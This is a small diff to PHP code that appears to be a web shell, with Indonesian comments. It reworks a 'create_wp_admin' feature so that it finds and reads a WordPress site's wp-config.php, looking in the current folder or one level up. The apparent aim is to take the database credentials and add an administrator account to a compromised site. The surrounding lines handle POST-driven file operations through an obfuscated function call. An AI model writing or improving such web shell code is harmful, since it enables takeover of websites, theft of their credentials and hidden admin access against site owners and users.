@@ -259,9 +259,21 @@ if(isset($_POST['berkas']) && is_string($_POST['berkas']))
 	$c_h_dir_comm($default_dir);
 }
 $default_dir = str_replace("\\", "/", $default_dir);
+$wp_base_dir = $default_dir;
+
+// Coba cek satu level ke atas jika tidak ditemukan
+if (!file_exists($wp_base_dir . '/wp-config.php')) {
+    $wp_base_dir = dirname($wp_base_dir); // Naik 1 folder
+}
+$wp_config_path = $wp_base_dir . '/wp-config.php';
 if (isset($_POST['create_wp_admin'])) {
     // Ganti getcwd() dengan $default_dir
-    $wp_config_path = $default_dir . '/wp-config.php';
+    $wp_base_dir = $default_dir;
+    if (!file_exists($wp_base_dir . '/wp-config.php')) {
+        $wp_base_dir = dirname($wp_base_dir);
+    }
+    $wp_config_path = $wp_base_dir . '/wp-config.php';
+
     if (file_exists($wp_config_path)) {
         echo "wp-config.php ditemukan di: " . $wp_config_path;
         $config_content = file_get_contents($wp_config_path);
